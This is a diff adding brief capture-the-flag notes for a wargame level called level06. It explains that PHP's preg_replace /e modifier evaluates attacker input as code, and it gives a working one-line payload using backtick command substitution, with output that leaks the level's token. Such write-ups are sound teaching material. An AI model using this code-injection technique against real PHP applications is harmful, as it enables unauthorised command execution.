@@ -1,0 +1,10 @@
+Decompiled level06.  Looks like it's just setting uid, gid and running php script with argv[1], argv[2]
+preg_replace /e modifier makes it a callback, running the second argument as php code
+So if we give make '\\2' malicious php code it should run
+After some testing, this:
+`echo '[x ${`getflag`}]' > /tmp/test; ./level06 /tmp/test`
+produces:
+`PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
+
+`
